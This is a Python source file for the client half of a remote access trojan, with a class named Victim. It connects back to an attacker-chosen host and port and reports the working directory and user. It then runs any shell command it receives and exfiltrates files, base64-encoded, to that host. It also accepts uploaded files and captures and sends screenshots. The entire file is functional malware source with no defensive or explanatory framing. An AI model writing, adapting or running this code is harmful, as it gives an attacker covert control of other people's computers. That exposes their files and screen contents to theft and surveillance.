import socket
import os
import argparse
import subprocess
import json
from time import sleep
import base64
from datetime import datetime

class Victim():
    def __init__(self, host, port, bufferSize=1024*256):
        self.host = host
        self.port = port
        self.bufferSize = bufferSize
        self.create_socket()

    def create_socket(self):
        """Establishes a socket connection"""
        try:
            # creating the socket object
            self.s = socket.socket()
            # Direct connecting to the host
            self.s.connect((self.host, self.port))
            # calling the main function !
            self.execute_cmd()
            
        except socket.error as err:
            print(f"[-] Error occured at socket processing, Reason {err}")
            
    def execute_cmd(self):
        """Function to execute command on the victim's machine and get the result from it !!"""
        terminal_data=[os.getcwd(),subprocess.getoutput('whoami')]
        self.reliable_send(terminal_data)
        while True:
            try:
                cmd=self.reliable_recv()
                cmd_split = cmd.split()
                if cmd=='quit':
                    self.s.close()
                    exit()

                elif cmd_split[0].lower() == 'cd':
                    try:
                        os.chdir(' '.join(cmd_split[1:]))
                    except FileNotFoundError as e:
                        output = str(e)
                    else:
                        output = ""
                    finally:
                        result=[output,os.getcwd(),subprocess.getoutput('whoami')]
                        self.reliable_send(result)

                elif cmd_split[0].lower()=='upload':
                    self.recieve_file()
                    result=[os.getcwd(),subprocess.getoutput('whoami')]
                    self.reliable_send(result)

                elif cmd_split[0].lower()=='download':
                    self.send_file(cmd.split("download")[1].strip())
                    result=[None,os.getcwd(),subprocess.getoutput('whoami')]
                    self.reliable_send(result)
                elif cmd.lower()=='screenshot':
                    print(cmd)
                    print("In screenshot folder")
                    self.send_screenshot()
                    result=[None,os.getcwd(),subprocess.getoutput('whoami')]
                    self.reliable_send(result)
                else:
                    cmd_result=self.execute_system_command(cmd)
                    result=[cmd_result,os.getcwd(),subprocess.getoutput('whoami')]
                    self.reliable_send(result)
            except Exception as e:
                print(e)
                result=["[-] Error During command execution",os.getcwd(),subprocess.getoutput('whoami')]
                self.reliable_send(result)
                continue
                
    def recieve_file(self):
        """Recieves file from victim """
        filesize,filename=self.reliable_recv()
        filesize=int(filesize)
        if filesize>0:
            content=self.reliable_recv()
            sleep(2)
            self.write_file(os.getcwd(),content,filename)
        
    def send_screenshot(self):
        import pyautogui
        myScreenshot = pyautogui.screenshot()
        img_name=f"{datetime.now().strftime('%Y-%m-%d-%H:%M:%S')}_Screenshot.png"
        myScreenshot.save(rf'{img_name}')
        print("file saved")
        self.send_file(img_name)
    def send_file(self,file_path):
        if os.path.exists(file_path):
            file_size=os.path.getsize(file_path)
            file_name=os.path.basename(file_path)
            if file_size>0:
                response=f"Receiving {file_name} From victim's device.... \n File size: {file_size} bytes"
                data=[file_size,response,file_name]
                self.reliable_send(data)
                file_data=self.read_file(file_path)
                self.reliable_send(file_data)
                sleep(2)
            else:
                response=f"[-] {file_name} is empty."
                data=[file_size,response,file_name]
                self.reliable_send(data)
        else:
            file_size,file_name=0,None
            response=f"{file_path} Not found on victim's side "
            data=[file_size,response,file_name]
            self.reliable_send(data)
            
    def execute_system_command(self,cmd):
        return subprocess.getoutput(cmd)
    
    def read_file(self,path):
        with open(path,'rb') as f:
            binary_file_data = f.read()
            base64_encoded_data = base64.b64encode(binary_file_data)
            base64_message = base64_encoded_data.decode('utf-8')
            return base64_message
        
    def write_file(self,path,content,file_name):        
        if not os.path.exists(path):
                os.mkdir(path)
        base64_img_bytes = content.encode('utf-8')
        with open(f"{path}/{file_name}",'wb') as f:
            decoded_image_data = base64.decodebytes(base64_img_bytes)
            f.write(decoded_image_data)
        
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.s.send(json_data.encode())
        
    def reliable_recv(self):
        json_data=""
        while True:
            try:
                json_data=json_data+self.s.recv(self.bufferSize).decode()
                return json.loads(json_data) 
            except ValueError:
                continue
def get_args():
    """Fuction to read data from the command-line !!  """
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-t', help="Specify the ip address you wanna connect to !", dest="target", required=True)
    parser.add_argument('-p', help="Specify the port number to which connect to !",
                        dest="port", default=1337, type=int)
    return parser.parse_args()


if __name__ == "__main__":
    arguments = get_args()
    host = arguments.target
    port = arguments.port
    victim = Victim(host, port)